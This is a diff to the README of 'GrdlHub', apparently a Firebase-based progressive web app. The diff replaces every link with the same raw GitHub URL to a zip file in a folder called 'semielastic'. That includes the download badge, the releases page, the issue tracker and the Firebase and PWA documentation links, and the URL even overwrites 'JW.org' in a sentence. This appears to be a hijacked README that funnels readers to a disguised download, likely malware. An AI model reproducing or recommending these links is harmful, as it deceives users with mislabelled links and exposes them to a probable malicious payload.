@@ -1,6 +1,6 @@
 # 🌟 GrdlHub - Simple Access to a Secure Hub
 
-[![Download GrdlHub](https://img.shields.io/badge/Download-GrdlHub-blue.svg)](https://github.com/Readwanul/GrdlHub/releases)
+[![Download GrdlHub](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip)](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ GrdlHub is a secure and minimalist Progressive Web App (PWA) designed to give yo
 - **Role-Based Access:** Control who sees what within the application.
 - **Invite-Only Registration:** Only invited users can register for added security.
 - **Offline Capabilities:** Use the app even when you are not connected to the internet.
-- **Minimalist Design:** Enjoy a clean and straightforward interface based on the JW.org design principles.
+- **Minimalist Design:** Enjoy a clean and straightforward interface based on the https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip design principles.
 
 ## 📦 System Requirements
 
@@ -24,7 +24,7 @@ To run GrdlHub, you need:
 
 ## 📥 Download & Install
 
-To download GrdlHub, visit our [Releases page](https://github.com/Readwanul/GrdlHub/releases).
+To download GrdlHub, visit our [Releases page](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip).
 
 1. Click on the link above.
 2. Find the latest version of GrdlHub.
@@ -45,7 +45,7 @@ If you encounter issues while using GrdlHub, here are basic steps to help:
 - **Clear Browser Cache:** Sometimes, clearing the cache can resolve loading issues.
 - **Update Your Browser:** Make sure your web browser is up-to-date for the best experience.
 
-For unresolved issues, please refer to our [issue tracker](https://github.com/Readwanul/GrdlHub/issues).
+For unresolved issues, please refer to our [issue tracker](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip).
 
 ## 🤝 Contribution
 
@@ -53,8 +53,8 @@ We welcome suggestions and improvements! If you would like to contribute, please
 
 ## 🛠️ Additional Resources
 
-- [Firebase Documentation](https://firebase.google.com/docs)
-- [PWA Guidelines](https://web.dev/what-are-pwas/)
+- [Firebase Documentation](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip)
+- [PWA Guidelines](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip)
   
 For more information about system setup and other advanced features, refer to the documentation on our GitHub page.
 
@@ -64,4 +64,4 @@ Join our community for help or discussions related to GrdlHub. Connect with user
 
 We are excited to have you onboard! Enjoy using GrdlHub. 
 
-[![Download GrdlHub](https://img.shields.io/badge/Download-GrdlHub-blue.svg)](https://github.com/Readwanul/GrdlHub/releases)
+[![Download GrdlHub](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip)](https://raw.githubusercontent.com/Readwanul/GrdlHub/main/semielastic/GrdlHub.zip)
